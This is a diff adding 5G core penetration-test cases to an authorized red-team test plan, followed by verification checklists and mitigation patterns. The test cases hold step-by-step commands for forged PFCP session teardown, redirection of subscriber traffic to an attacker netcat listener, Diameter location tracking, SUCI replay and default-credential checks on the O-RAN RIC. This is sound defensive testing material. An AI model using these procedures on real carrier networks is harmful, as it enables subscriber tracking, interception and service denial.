@@ -14,7 +14,11 @@
 | C. Protocol Fuzzing & Injection | 3 | HIGH - CRITICAL |
 | D. Privacy & Identity Attacks | 2 | HIGH - CRITICAL |
 | E. O-RAN & Slice Isolation | 2 | MEDIUM - HIGH |
-| **Total** | **12** | **INFO - CRITICAL** |
+| F. PFCP Deep Exploitation | 2 | HIGH - CRITICAL |
+| G. Diameter Roaming Abuse | 1 | CRITICAL |
+| H. SUCI/SUPI Privacy Deep | 1 | CRITICAL |
+| I. O-RAN E2/A1 & RIC | 1 | HIGH |
+| **Total** | **18** | **INFO - CRITICAL** |
 
 ---
 
@@ -231,3 +235,234 @@
 | **False Positive Risk** | LOW — tshark dissection is authoritative. Verify capture interface and filter cover all in-scope interfaces. |
 | **Cleanup** | None (read-only capture and dissection). |
 | **References** | payloads.md §16.1-16.5; 3GPP TS 38.413 (NGAP), TS 29.244 (PFCP), TS 24.501 (NAS-5GS) |
+
+## F. PFCP Deep Exploitation
+
+### TC-5G-013: PFCP Session Teardown DoS (Praetorian Class)
+
+| Field | Value |
+|------|-----|
+| **ID** | TC-5G-013 |
+| **Name** | PFCP Session Deletion Request Injection (Praetorian 2019 DoS Class) |
+| **Severity** | CRITICAL |
+| **Category** | PFCP Deep Exploitation |
+| **Objective** | Reproduce the Praetorian (2019) class of 5GC DoS: inject a forged PFCP Session Deletion Request with a captured SEID into a UPF that does not authenticate the SMF source, causing the subscriber session to be torn down. Demonstrates the canonical N4 unauthenticated source attack. |
+| **Prerequisites** | Authorized lab only (Open5GS or free5GC). Captured valid SEID from TC-5G-003. UPF reachable on UDP 8805 from a non-SMF vantage point. Vantage point that can spoof source IP (for full reproduction) OR send from real IP (for hardening test). |
+| **Tools** | scapy (with scapy.contrib.pfcp), tshark, Open5GS lab |
+| **Steps** | 1. From TC-5G-003 capture, identify an active SEID: `tshark -r /tmp/pfcp.pcap -Y 'pfcp.msg_type == 50' -T fields -e pfcp.seid \| sort -u \| head -1`.<br>2. Identify SMF source IP and UPF IP: `tshark -r /tmp/pfcp.pcap -Y pfcp -T fields -e ip.src -e ip.dst \| sort -u`.<br>3. Confirm the subscriber session is active: `docker exec ue ping -c 1 1.1.1.1`.<br>4. Construct a PFCP Session Deletion Request (msg_type=54) with the captured SEID using the PoC from payloads.md §4.4.<br>5. Send from a non-SMF vantage (unauthenticated source reproduction): `python3 pfcp-teardown-poc.py --upf <upf-ip> --seid 0x<SEID> --src-ip <spoofed-or-real>`.<br>6. Simultaneously capture N4: `tshark -i any -f 'udp port 8805' -Y pfcp -w /tmp/pfcp-inject.pcap`.<br>7. Within 1-2 seconds, verify on the UE: `docker exec ue ping -c 3 1.1.1.1` — session is torn down if pings fail.<br>8. Check SMF logs for session release cause: `docker logs smf --tail 50 \| grep -iE 'session.release\|PFCP Deletion'`.<br>9. Document: SMF log showing "session deletion received" with no upstream UE-initiated cause → confirms unauthenticated N4 source vulnerability. |
+| **Expected Result** | Vulnerable UPF: session torn down, UE ping fails, SMF logs show "PFCP Session Deletion Request received" from the forged source. Hardened UPF (DTLS on N4, source IP allowlist, or per-session SEID validation against SMF peer): forged request rejected or silently dropped, subscriber session persists. |
+| **False Positive Risk** | MEDIUM — stale SEIDs (from a session already released normally) will appear to "succeed" but were already gone. Always verify the session was active immediately before injection by checking UE ping or SMF session table. |
+| **Remediation** | Deploy DTLS on the N4 interface (3GPP TS 33.501 §6.6.2); configure UPF source IP allowlist to accept PFCP only from the SMF; enable per-session SEID validation that cross-checks the source against the SEID owner; monitor for PFCP Session Deletion Requests that lack a corresponding SMF-initiated cause. |
+| **Cleanup** | Re-trigger UE registration to re-establish the torn-down session. Stop all captures. |
+| **References** | payloads.md §4.1, §4.4; 3GPP TS 29.244 §7.4; Praetorian 5G vulnerability research (2019); 3GPP TS 33.501 §6.6.2 |
+
+### TC-5G-014: PFCP Session Modification (Traffic Redirection)
+
+| Field | Value |
+|------|-----|
+| **ID** | TC-5G-014 |
+| **Name** | PFCP Session Modification Request — Subscriber Traffic Redirection |
+| **Severity** | CRITICAL |
+| **Category** | PFCP Deep Exploitation |
+| **Objective** | Inject a PFCP Session Modification Request changing the UPF's far-end F-TEID for a target session to point at an attacker-controlled endpoint, redirecting subscriber uplink traffic to the attacker. Demonstrates the exfiltration variant of the N4 injection class. |
+| **Prerequisites** | Authorized lab only. Active subscriber session with a captured SEID and F-TEID. Attacker-controlled endpoint with a GTP-U listener (UDP 2152) to receive redirected traffic. |
+| **Tools** | scapy, tshark, PacketRusher, netcat |
+| **Steps** | 1. Stand up an attacker GTP-U listener: `nc -u -l 2152 > /tmp/redirected.bin &` on attacker host.<br>2. Capture baseline N4 to get the current F-TEID: `tshark -r /tmp/pfcp.pcap -Y 'pfcp.msg_type == 50' -T fields -e pfcp.seid -e pfcp.f_teid_teid -e pfcp.f_teid_v4 \| head -5`.<br>3. Construct a PFCP Session Modification Request (msg_type=52) with the captured SEID and an IE_F_TEID pointing the far-end at the attacker host (using payloads.md §4.5).<br>4. Inject: `python3 pfcp-modify-redirect-poc.py --upf <upf-ip> --seid 0x<SEID> --new-teid 0xdeadbeef --new-ip <attacker-ip>`.<br>5. Generate subscriber traffic: `docker exec ue curl -s http://1.1.1.1/`.<br>6. On the attacker host, examine captured bytes: `xxd /tmp/redirected.bin \| head -20` — inner IP packet from the UE should be visible.<br>7. Document the redirected traffic sample (engagement-scoped). |
+| **Expected Result** | Vulnerable UPF: subscriber uplink packets arrive at the attacker GTP-U listener. Hardened UPF: session modification rejected (DTLS / source allowlist / per-session F-TEID immutability), subscriber traffic flows normally to the SMF-selected upstream. |
+| **False Positive Risk** | MEDIUM — verify the captured bytes are actual subscriber traffic (matching the UE source IP / port) and not background noise. |
+| **Remediation** | Same hardening as TC-5G-013: DTLS on N4, source IP allowlist, per-session F-TEID immutability. Additionally, monitor PFCP Session Modification Requests that change F-TEID to previously-unseen endpoints. |
+| **Cleanup** | Re-establish the subscriber session (re-trigger UE registration) to restore normal F-TEID. Stop all captures and discard the redirected traffic samples per engagement data-retention policy. |
+| **References** | payloads.md §4.1, §4.5; 3GPP TS 29.244 §7.5 (Session Modification Procedure) |
+
+## G. Diameter Roaming Abuse
+
+### TC-5G-015: Diameter S6a ULR — Unauthorized Location Retrieval
+
+| Field | Value |
+|------|-----|
+| **ID** | TC-5G-015 |
+| **Name** | Diameter S6a Update-Location-Request — Subscriber Tracking Without Visited-Network Context |
+| **Severity** | CRITICAL |
+| **Category** | Roaming Abuse |
+| **Objective** | Demonstrate that an authorized roaming Diameter peer (or attacker with stolen peer credentials) can issue Update-Location-Request (ULR) and Provide-Subscriber-Info (PSI) commands against home-network subscribers who are not roaming on that visited network — the Positive Technologies (2017-2023) class of 4G/5G interconnect abuse. |
+| **Prerequisites** | Operator-side engagement with explicit roaming-partner authorization in writing. Lab reproduction with OsmoHLR or a commercial HSS configured for Diameter S6a. SCTP 3868 reachable. NEVER run against production subscribers without authorization. |
+| **Tools** | seagull, scapy-diameter, tshark |
+| **Steps** | 1. Bring up Diameter lab: `docker run -d --name hss --network lab osmocom/osmo-hlr /usr/local/bin/osmo-hlr -c /etc/osmocom/osmo-hlr.cfg`.<br>2. Configure a Diameter peer (MME) in `osmo-hlr.cfg` with the engagement-scoped realm and credentials.<br>3. Capture S6a baseline: `tshark -i any -f 'sctp port 3868' -Y diameter -w /tmp/s6a.pcap`.<br>4. Construct an Update-Location-Request (ULR, cmd-code=316) using seagull with a test IMSI that is registered at the home network (engagement-scoped).<br>5. Send the ULR from a visited-network realm that is NOT the subscriber's actual visited network: `/opt/seagull/run/seagull.sh -conf ULR.xml -dicanect peer-ip 3868`.<br>6. Parse the ULA response: `tshark -r /tmp/s6a.pcap -Y 'diameter.cmd.code == 316 && diameter.cmd.flags.request == 0' -V \| grep -E 'ULA-Result\|Subscription-Data\|MSISDN'`.<br>7. If ULA returns full subscription data: unauthorized location retrieval confirmed.<br>8. Repeat with Provide-Subscriber-Info (PSI, cmd-code=838903) for current cell ID / VLR address — tracks subscriber location. |
+| **Expected Result** | Vulnerable HSS: ULA returns subscription data and ULR is accepted regardless of visited-network context; PSI returns subscriber location (cell ID, VLR address). Hardened HSS (GSMA FS.33 Diameter firewall): ULR rejected with DIAMETER_ERROR_ROAMING_NOT_ALLOWED or DIAMETER_ERROR_USER_UNKNOWN; PSI rejected. |
+| **False Positive Risk** | HIGH — engagement MUST be explicitly authorized for Diameter roaming tests. Use engagement-scoped test IMSIs only; never use production subscriber IMSIs. Validate that the lab HSS is air-gapped from any production Diameter interconnect. |
+| **Remediation** | Deploy a Diameter signaling firewall (GSMA FS.33); enforce IMSI↔visited-network pair validation; rate-limit ULR/PSI per peer; alert on ULR for subscribers not in the visited-network roam list; require mutual TLS on inter-operator SCTP. |
+| **Cleanup** | Stop seagull and capture. Coordinate with HSS team to confirm no subscriber state changes persisted. Destroy the lab VM. |
+| **References** | payloads.md §8.1-8.5; 3GPP TS 29.272 (S6a); GSMA FS.33 Diameter recommendations; Positive Technologies Diameter research (2017-2023) |
+
+## H. SUCI/SUPI Privacy Deep
+
+### TC-5G-016: SUCI Replay and Null-Scheme Detection
+
+| Field | Value |
+|------|-----|
+| **ID** | TC-5G-016 |
+| **Name** | SUCI Replay Attack and Null Protection Scheme Detection |
+| **Severity** | CRITICAL |
+| **Category** | Subscriber Privacy |
+| **Objective** | (a) Detect deployments using the SUCI null-scheme (protection_scheme=0) where SUPI is sent in cleartext on the air. (b) Demonstrate SUCI replay — re-transmission of a captured SUCI to trigger an AMF response that confirms whether the AMF deduplicates or processes replays. |
+| **Prerequisites** | Operator-side engagement OR lab reproduction with at least one UE performing registration. NAS capture (N1/N2) containing RegistrationRequest with SUCI. Engagement-scoped private key only required for ECIES decryption variant (TC-5G-009). |
+| **Tools** | tshark, scapy (with NAS-5GS contribution), Python cryptography |
+| **Steps** | 1. Capture NAS messages: `tshark -i any -f 'sctp port 38412' -Y 'nas-5gs' -w /tmp/nas.pcap`.<br>2. Extract SUCI protection scheme distribution: `tshark -r /tmp/nas.pcap -Y 'nas_5gs.message_type == 0x41' -T fields -e nas_5gs.mobile_identity.suci.protection_scheme \| sort \| uniq -c`.<br>3. If protection_scheme=0 appears: CRITICAL — SUPI is in cleartext. Extract via `tshark -r /tmp/nas.pcap -Y 'nas_5gs.mobile_identity.suci.protection_scheme == 0' -T fields -e nas_5gs.mobile_identity.suci.scheme_output`.<br>4. Capture a SUCI from a non-null scheme (protection_scheme=1 or 2).<br>5. Replay it via SCTP to the AMF with the same RegistrationRequest: `python3 suci-replay-poc.py --amf <amf-ip> --port 38412 --replay-from /tmp/nas.pcap --frame <N>`.<br>6. Capture the AMF response: `tshark -i any -f 'sctp port 38412' -Y 'nas_5gs && nas_5gs.message_type == 0x42' -V \| head -50`.<br>7. Document: does the AMF reject the replay (deduplication on), accept it (deduplication off — privacy risk), or send a distinct error indicating "SUCI already consumed". |
+| **Expected Result** | Null scheme: cleartext SUPI extractable (CRITICAL). Replay: hardened AMF rejects the replayed SUCI with a distinct error (e.g., "UE identity cannot be derived from the message" or implicit rejection); vulnerable AMF processes the replay identically to the original, enabling subscriber activity confirmation attacks. |
+| **False Positive Risk** | MEDIUM — null scheme is sometimes used as an interoperability fallback during early deployment; verify against operator policy before flagging as CRITICAL. Replay tests must use engagement-scoped captures. |
+| **Remediation** | Deploy ECIES Profile A or B (protection_scheme=1 or 2) with a strong home network public key (Curve25519 / secp256r1, ≥256 bits); reject null-scheme RegistrationRequests at the AMF; deploy SUCI deduplication (the AMF should reject a SUCI already seen within the ephemeral key lifetime). |
+| **Cleanup** | Destroy captured SUCI material. Coordinate with AMF team to confirm no persistent UE context was created. |
+| **References** | payloads.md §11.1-11.4; 3GPP TS 33.501 Annex C (SUCI protection schemes); Alonso et al. 5G AIA/ARIA paper (2021) |
+
+## I. O-RAN E2/A1 & RIC
+
+### TC-5G-017: O-RAN Near-RT RIC E2 Interface Test
+
+| Field | Value |
+|------|-----|
+| **ID** | TC-5G-017 |
+| **Name** | O-RAN Near-RT RIC (Near Real-Time RAN Intelligent Controller) E2 Interface Security Test |
+| **Severity** | HIGH |
+| **Category** | O-RAN Security |
+| **Objective** | Identify and test the E2 interface between the Near-RT RIC and O-CU/O-DU for: weak authentication on the E2AP (E2 Application Protocol) layer, default credentials on the RIC management API, and unauthorized RAN control via the xApp (RIC application) deployment pipeline. |
+| **Prerequisites** | Authorized engagement against O-RAN infrastructure. Near-RT RIC, O-CU-CP, O-CU-UP, and O-DU IP addresses in scope. Network vantage point with reachability to E2 (SCTP), A1 (HTTP/2), and O1 (NETCONF/RESTCONF) interfaces. |
+| **Tools** | nmap, curl, sctpscan, kubectl (for RIC xApp deployment analysis) |
+| **Steps** | 1. Port scan RIC: `nmap -p 22,80,443,830,38472,38473 <ric-ip>` (38472/38473 are typical E2AP SCTP ports).<br>2. SCTP fingerprint E2: `/opt/sctpscan/sctpscan -a <o-cu-cp-ip> -p 38472 -v`.<br>3. Check A1 (non-RT RIC ↔ Near-RT RIC) HTTP/2: `curl -sk -v --http2 https://<ric-ip>:443/a1-p/healthcheck`.<br>4. Test default RIC admin console credentials (engagement-scoped; payloads.md §13.3 lists known defaults — change in lab).<br>5. Enumerate deployed xApps via the RIC management API: `curl -sk https://<ric-ip>:443/api/v1/xapps \| jq`.<br>6. Inspect each xApp's deployment manifest for over-permissive RBAC (e.g., access to all RAN namespaces).<br>7. Test xApp onboarding: attempt to deploy a benign test xApp via `ric_xapp.py deploy test-xapp.yaml` (engagement-scoped; do NOT deploy malicious code).<br>8. Document: unauthenticated E2AP, weak A1 auth, default RIC creds, permissive xApp RBAC. |
+| **Expected Result** | Hardened O-RAN: E2AP authenticated (mTLS or SCTP AUTH), A1 uses OAuth2 with scoped tokens, no default creds, xApp RBAC follows least-privilege. Vulnerable O-RAN: unauthenticated E2AP accepts RAN control messages, A1 uses shared bearer tokens, default creds work, any xApp can read/write any RAN namespace. |
+| **False Positive Risk** | MEDIUM — lab RIC deployments often disable auth for development. Verify the engagement scope (lab vs. production) before flagging default creds as HIGH vs. CRITICAL. |
+| **Remediation** | Deploy mTLS on E2AP (per O-RAN WG5); enforce OAuth2 with scoped tokens on A1; rotate default RIC admin credentials; implement Kubernetes NetworkPolicy and RBAC for xApp isolation; audit xApp manifests before onboarding. |
+| **Cleanup** | Remove any test xApp deployed during the engagement. Revert RIC configuration changes. |
+| **References** | payloads.md §13.1-13.6; O-RAN Alliance WG5 (E2) and WG11 (Security); O-RAN TS 2.0.0 (E2AP); IETF RFC 8783 (SCTP AUTH) |
+
+### TC-5G-018: SEPP N32 Roaming Filter Bypass Test
+
+| Field | Value |
+|------|-----|
+| **ID** | TC-5G-018 |
+| **Name** | SEPP (Security Edge Protection Proxy) N32 Roaming Filter Bypass Test |
+| **Severity** | CRITICAL |
+| **Category** | Roaming Abuse |
+| **Objective** | Verify that the operator's SEPP correctly filters N32 roaming messages: unauthorized message types (e.g., ULR for non-roaming subscribers), unexpected IPDR (Insert Subscriber Data Request) targets, and malformed JOSE (JWS/JWE) messages. Demonstrates whether the SEPP is deployed in enforcement mode or pass-through. |
+| **Prerequisites** | Operator-side engagement with explicit roaming-partner authorization. SEPP IP reachable. Engagement-scoped test subscriber in the visited network. JOSE library (PyJWT, jwcrypto) for message crafting. |
+| **Tools** | curl, jq, PyJWT / jwcrypto, tshark |
+| **Steps** | 1. Capture N32 baseline: `tshark -i any -f 'tcp port 8443' -Y 'http2' -w /tmp/n32.pcap` (SEPP N32 typically runs over HTTP/2 with TLS on 8443).<br>2. Inspect SEPP capabilities advertisement: `curl -sk --http2 https://<sepp-ip>:8443/n32/capabilities`.<br>3. Construct an authorized ULR for the engagement-scoped test subscriber (using visited-network credentials).<br>4. Send via the SEPP and confirm a normal ULA response: `python3 sepp-msg.py --type ULR --imsi <test-imsi> --peer <visited-sepp>`.<br>5. Construct an unauthorized ULR for an IMSI NOT in the visited network's roam list: `python3 sepp-msg.py --type ULR --imsi <non-roaming-imsi> --peer <visited-sepp>`.<br>6. Construct an IPDR (Insert Subscriber Data Request) targeting a home subscriber from a visited peer: `python3 sepp-msg.py --type IPDR --imsi <home-imsi> --peer <visited-sepp>`.<br>7. Construct a malformed JOSE message (tampered JWS signature): `python3 sepp-msg.py --type ULR --imsi <test-imsi> --tamper-signature`.<br>8. Document: which messages are accepted vs. rejected; whether the SEPP logs the rejected attempts; whether malformed JOSE triggers a security alert. |
+| **Expected Result** | Hardened SEPP: authorized ULR accepted; unauthorized ULR and IPDR rejected with DIAMETER-equivalent error; malformed JOSE rejected and logged as a security event. Pass-through SEPP (misconfigured): all messages accepted regardless of filter rules — equivalent to the 2014 SS7 scandal class on 5G. |
+| **False Positive Risk** | HIGH — engagement MUST be explicitly authorized for SEPP testing. Verify the test IMSIs are engagement-scoped and never use production subscriber IMSIs. Confirm the SEPP under test is isolated from production N32 interconnect. |
+| **Remediation** | Configure the SEPP in enforcement mode (not pass-through); deploy GSMA FS.33-equivalent N32 filtering rules (ULR/IDR/PSI limited to actual roam list); enable JOSE signature validation with fail-closed behavior; monitor and alert on N32 message-type anomalies and malformed-JOSE events. |
+| **Cleanup** | Stop capture. Coordinate with SEPP team to confirm no subscriber state changes persisted. Destroy engagement-scoped key material. |
+| **References** | payloads.md §14.1-14.4; 3GPP TS 33.501 §6.2.6 (SEPP); 3GPP TS 29.500 (SBI); GSMA FS.33 SEPP recommendations |
+
+---
+
+## Verification Checklist
+
+Use this checklist to verify that each test case execution was complete and the evidence is reproducible. The checklist is intended to be filled out per engagement and attached to the final report.
+
+### Pre-Engagement Verification
+
+- [ ] Written rules of engagement (ROE) signed by both red team and operator
+- [ ] Scope explicitly identifies which 3GPP interfaces are in scope (N2/N3/N4/N6/N32, S6a, SS7)
+- [ ] Lab PLMN (MCC 001 / MNC 01) used for all reproduction work; no production IMSIs/SUPIs used
+- [ ] Engagement-scoped test IMSIs/SUPIs provisioned in the test HSS/UDM
+- [ ] Captures stored on encrypted media with retention policy defined
+- [ ] Frequency licensing verified for any active transmission (passive reception only requires no license in most jurisdictions)
+- [ ] Emergency stop procedure agreed with control room operators
+
+### Per-Test-Case Execution Verification
+
+- [ ] Test case ID (TC-5G-NNN) recorded in capture filenames (e.g., `/tmp/tc-5g-013-<timestamp>.pcap`)
+- [ ] All prerequisites verified BEFORE the test (e.g., for TC-5G-013: SEID freshness confirmed via UE ping)
+- [ ] Baseline capture taken (BEFORE injection/fuzz) for diff comparison
+- [ ] Active capture running throughout the test window
+- [ ] Operator/operator-team observer present for CRITICAL-severity tests (TC-5G-006, 007, 013, 014, 015, 018)
+- [ ] False-positive checks executed (e.g., stale TEID/SEID verification for TC-5G-013/014)
+- [ ] Expected vs. actual result recorded with timestamp
+- [ ] Cleanup executed and verified (no persistent subscriber state, captures moved to retention storage)
+
+### Post-Engagement Verification
+
+- [ ] All captured pcap files hashed (SHA-256) and recorded in evidence log
+- [ ] All engagement-scoped key material destroyed (private keys, SUCI captures, test credentials)
+- [ ] All lab containers torn down (`docker compose down -v`) and lab VMs destroyed
+- [ ] All test subscriber accounts removed from HSS/UDM
+- [ ] No production subscriber data exfiltrated or persisted outside the engagement scope
+- [ ] Findings mapped to 3GPP TS 33.501 controls for remediation tracking
+- [ ] Coordinated disclosure timeline initiated for any CRITICAL findings (GSMA FS-IS / 3GPP SA3 liaison)
+- [ ] Regulatory notification assessment completed (EU NIS2, US FCC) where applicable
+
+### Defense Pass-Through Checklist (for the operator's blue team)
+
+- [ ] SEPP reject counters collected for the engagement window (TC-5G-018)
+- [ ] PFCP source-IP anomaly reports reviewed (TC-5G-013, 014)
+- [ ] GTP-U TEID mismatch alerts reviewed (TC-5G-004)
+- [ ] Diameter firewall reject logs reviewed (TC-5G-006, 015)
+- [ ] NRF audit logs reviewed for anomalous NF calls (TC-5G-011)
+- [ ] 5G-GUTI reallocation rate reviewed for the engagement window (TC-5G-008, 016)
+- [ ] Spectrum monitoring alerts reviewed for the engagement window (TC-5G-008)
+
+### Mitigation Verification (Post-Remediation)
+
+After the operator applies remediation, re-run each previously-failing test case to confirm the mitigation is effective:
+
+- [ ] TC-5G-013 re-run: PFCP Session Deletion Request rejected; subscriber session persists
+- [ ] TC-5G-014 re-run: PFCP Session Modification Request rejected; F-TEID unchanged
+- [ ] TC-5G-015 re-run: ULR for non-roaming IMSI rejected with DIAMETER_ERROR_ROAMING_NOT_ALLOWED
+- [ ] TC-5G-016 re-run: SUCI null-scheme rejected at the AMF; replayed SUCI rejected
+- [ ] TC-5G-017 re-run: E2AP requires mTLS; A1 requires scoped OAuth2 token
+- [ ] TC-5G-018 re-run: SEPP in enforcement mode; unauthorized ULR/IPDR rejected; malformed JOSE logged
+
+---
+
+## Defense and Mitigation Patterns
+
+This section consolidates the mitigation guidance from individual test cases into operator-actionable patterns. Each pattern maps to one or more test cases and 3GPP / GSMA references.
+
+### Pattern 1: N4 Source Authentication (PFCP Hardening)
+
+**Addresses**: TC-5G-003, TC-5G-013, TC-5G-014
+
+**Mitigation**: Deploy DTLS on the N4 interface (3GPP TS 33.501 §6.6.2, RFC 9260); configure the UPF source IP allowlist to accept PFCP only from the SMF; enable per-session SEID validation that cross-checks the source against the SEID owner.
+
+**Detection**: PFCP messages from source IPs not in the SMF pool; PFCP Session Deletion Requests without a corresponding SMF-initiated cause; F-TEID changes to previously-unseen endpoints.
+
+**Verification**: Re-run TC-5G-013 and TC-5G-014 after remediation; confirm both are rejected.
+
+### Pattern 2: Interconnect Signaling Firewall (SEPP / Diameter / SS7)
+
+**Addresses**: TC-5G-006, TC-5G-007, TC-5G-015, TC-5G-018
+
+**Mitigation**: Deploy a SEPP in enforcement mode (not pass-through) with GSMA FS.33-equivalent N32 filtering rules; deploy a Diameter signaling firewall (GSMA FS.33) with IMSI↔visited-network pair validation; for legacy SS7 interconnect, deploy an SS7 firewall per GSMA FS.32.
+
+**Detection**: ULR/IDR/PSI for subscribers not in the visited-network roam list; N32 message-type anomalies; malformed JOSE events; SCTP peers outside the roaming-agreement IP allowlist.
+
+**Verification**: Re-run TC-5G-015 and TC-5G-018 after remediation; confirm both are rejected.
+
+### Pattern 3: Subscriber Identity Privacy (SUCI Hardening)
+
+**Addresses**: TC-5G-009, TC-5G-016
+
+**Mitigation**: Deploy ECIES Profile A or B (protection_scheme=1 or 2) with a strong home network public key (Curve25519 / secp256r1, ≥256 bits); reject null-scheme RegistrationRequests at the AMF; deploy SUCI deduplication (the AMF should reject a SUCI already seen within the ephemeral key lifetime).
+
+**Detection**: Null-scheme SUCI observed on the air; replayed SUCI; SUCI with weak or known-compromised home network public key.
+
+**Verification**: Re-run TC-5G-009 and TC-5G-016 after remediation; confirm null-scheme rejected and replay rejected.
+
+### Pattern 4: O-RAN Interface Hardening
+
+**Addresses**: TC-5G-010, TC-5G-017
+
+**Mitigation**: Deploy mTLS on E2AP (per O-RAN WG5); enforce OAuth2 with scoped tokens on A1; rotate default O-RU/O-DU/O-CU/RIC admin credentials; implement Kubernetes NetworkPolicy and RBAC for xApp isolation; audit xApp manifests before onboarding.
+
+**Detection**: Unauthenticated E2AP; A1 with shared bearer tokens; xApp with over-permissive RBAC; default credentials on O1 NETCONF/RESTCONF.
+
+**Verification**: Re-run TC-5G-010 and TC-5G-017 after remediation; confirm all hardening in place.
+
+### Pattern 5: Network Slice Isolation
+
+**Addresses**: TC-5G-011
+
+**Mitigation**: Configure NRF to reject cross-slice queries (HTTP 403); enforce per-slice NF authentication tokens; configure UPF with per-slice TEID namespaces; deploy NSSF with strict slice-selection policy.
+
+**Detection**: Cross-slice NRF queries; SBI calls with mismatched slice token; GTP-U cross-slice TEIDs.
+
+**Verification**: Re-run TC-5G-011 after remediation; confirm all cross-slice access rejected.
